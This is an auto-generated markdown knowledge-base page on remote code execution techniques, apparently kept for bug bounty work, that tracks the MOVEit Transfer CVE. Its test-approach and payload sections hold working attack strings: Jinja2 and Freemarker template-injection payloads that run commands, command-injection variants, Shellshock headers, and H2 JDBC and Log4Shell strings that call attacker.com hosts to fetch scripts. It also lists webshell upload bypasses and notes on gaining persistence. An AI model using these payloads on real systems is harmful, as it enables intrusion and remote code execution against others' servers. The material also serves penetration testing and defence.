# RCE Techniques

> Tracked CVEs and techniques for this class. Updated via daily `refresh-latest` pipeline.

_Last updated: 2026-04-17 · Items: 1_

---

## What

_Define the class, prerequisites, and typical finding shape. Fill with real content._
_pending enrichment — baseline opener below_

See items under ## Items for per-finding details.

---

## CVEs

| CVE | Date | Title | CVSS | Status | Src |
|---|---|---|---|---|---|
| CVE-2023-34362 | 2026-04-17 | Patch Diffing Progress MOVEit Transfer RCE (CVE-2023-34362) | high | patched | [src](https://www.assetnote.io/resources/research/patch-diffing-progress-moveit-transfer-rce-cve-2023-34362) |
| cve-2023-34362 | 2026-04-17 | Patch Diffing Progress MOVEit Transfer RCE (CVE-2023-34362) | high | patched | [src](https://www.assetnote.io/resources/research/patch-diffing-progress-moveit-transfer-rce-cve-2023-34362) |

---

## Probes

_Grep, curl, nuclei probes for this class. Append as items arrive with real PoCs._
_pending enrichment_

---

## PoCs

_Public PoC links rolled up from items below._

- **CVE-2023-34362** — [source](https://www.assetnote.io/resources/research/patch-diffing-progress-moveit-transfer-rce-cve-2023-34362)

---

## Reproduction

_Step-by-step repro steps per CVE. Populated as items arrive with enough detail._
_pending enrichment_

---

## Defense

_Patch guidance and detection rules. Populated from vendor advisories._
_pending enrichment_

---

## References

- [www.assetnote.io](https://www.assetnote.io/resources/research/patch-diffing-progress-moveit-transfer-rce-cve-2023-34362)

---

## Items

> Remote Code Execution — achieving arbitrary command execution on a target system through web application vulnerabilities.

## Surface

- File upload endpoints — SVG, PHAR, JSP, ASPX, polyglot uploads
- Template engines — SSTI in Jinja2, Twig, Freemarker, Velocity, Pebble
- JDBC/database connection string injection — H2 `INIT=`, PostgreSQL COPY
- XML deserialization — .NET `XmlSerializer`, Java `XMLDecoder`, PHP `unserialize`
- SSRF to internal services — pivot to metadata API, Redis, Memcached, Gopher
- Command injection in shell-invoking functions — `exec`, `system`, `popen`, `Runtime.exec`
- Log4Shell-style JNDI injection in logged user-controlled fields
- Insecure eval/code execution in node.js/Ruby/Python — `eval(params[:code])`

## Test Approach

1. **SSTI detection** — inject math expressions that differ between reflection and eval:

   ```
   {{7*7}}  → 49 = SSTI
   ${7*7}   → 49 = EL/Freemarker
   <%= 7*7 %> → 49 = ERB
   ```

2. **SSTI escalation** (Jinja2):

   ```
   {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
   ```

3. **File upload — PHAR/JSP**:
   - Rename `.php` to `.php5`, `.phtml`, `.php%00.jpg`
   - Upload SVG with `<script>` or SSRF-triggering XXE
   - Try PHAR deserialization: `phar://upload/file.jpg/exploit`
4. **JDBC H2 injection** — probe unauthenticated setup/validation endpoints:

   ```
   {"db": "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://attacker.com/rce.sql'"}
   ```

5. **Command injection** — probe shell-adjacent params:

   ```
   ?host=127.0.0.1;id
   ?filename=test$(id).txt
   ?cmd=127.0.0.1`id`
   ```

6. **SSRF → internal RCE pivot** — use gopher:// to hit Redis `SLAVEOF`, or Memcached `set` for deserialization
7. **Log4Shell** — probe all headers and params:

   ```
   ${jndi:ldap://collab.attacker.com/a}
   X-Api-Version: ${jndi:ldap://...}
   ```

## Tools

- **nuclei** — SSTI, Log4Shell, RCE templates: `nuclei -t rce/ -u https://target.com`
- **tplmap** — automated SSTI exploitation: `python3 tplmap.py -u "https://target.com/render?name=*"`
- **Interactsh** — OOB callback server for blind RCE: `interactsh-client`
- **ysoserial** — Java deserialization gadget chains: `java -jar ysoserial.jar CommonsCollections6 'id'`
- **commix** — command injection automation: `commix --url="https://target.com/ping?host=*"`

## Payloads / Probes

```
# Werkzeug debugger
# Supply a string with a homoglyph 'і' (Cyrillic) to force an unhandled exception
# If debug mode is on, the interactive debugger spawns
# PIN format: ***-***-*** — brute-forceable when running locally
strіng

# Shellshock — inject in HTTP headers (User-Agent, Referer, Cookie)
() { :;}; echo vulnerable
curl -H "User-Agent: () { :; }; /bin/eject" http://target.com/cgi-bin/test.cgi

# SSTI - Jinja2 RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# SSTI - Freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# Command injection variants
; id
$(id)
`id`
| id
%0aid

# H2 JDBC RCE
jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://attacker.com/cmd.sql'

# Log4Shell
${jndi:ldap://attacker.interactsh.com/a}
${${lower:j}ndi:${lower:l}dap://attacker.com/a}

# PHP file upload - null byte bypass
filename="shell.php%00.jpg"
```

## Chain Opportunities

- **SSRF → RCE** — SSRF reaches internal Jenkins/Solr/Redis, pivot to code execution
- **SSTI → RCE → persistence** — write cron job or SSH key via template engine
- **File upload → RCE** — bypass extension filter, execute webshell
- **JDBC injection → RCE** — H2/PostgreSQL INIT scripts execute OS commands
- **Deserialization → RCE** — Java/PHP gadget chains in XML, session cookies, API params

## Recent Intel

- **CVE-2023-24489** · Citrix ShareFile pre-auth RCE via `UploadClientModule.asmx` — unsafe .NET XML deserialization, `ObjectDataProvider` gadget chain · https://www.assetnote.io/resources/research/advisory-sharefile-pre-auth-rce-cve-2023-24489
- **CVE-2023-34362** · MOVEit Transfer RCE — deserialization in file processing pipeline, SYSTEM-level compromise via crafted file transfer · https://www.assetnote.io/resources/research/moveit-transfer-rce-part-two-cve-2023-34362
- **CVE-2023-38646** · Metabase pre-auth RCE — H2 JDBC `INIT` param via `/api/setup/validate`, SQL → Java method invocation chain · https://www.assetnote.io/resources/research/chaining-our-way-to-pre-auth-rce-in-metabase-cve-2023-38646

## 2026-04-17

### Patch Diffing Progress MOVEit Transfer RCE (CVE-2023-34362) — `CVE-2023-34362`

- **Tags:** `#rce`
- **Severity:** high · **Hunt:** 4/5 · **Score:** 14.0 · **Status:** patched · **Age:** 30d
- **Sources:** [1](https://www.assetnote.io/resources/research/patch-diffing-progress-moveit-transfer-rce-cve-2023-34362)

**[Patch Diffing Progress MOVEit Transfer RCE]** — A technique to discover RCE vulnerabilities in Progress MOVEit Transfer by analyzing patch differences. Hunt: Check for unpatched MOVEit Transfer instances and analyze patch diffs for RCE vectors. [src](https://www.assetnote.io/resources/research/patch-diffing-progress-moveit-transfer-rce-cve-2023-34362)

---
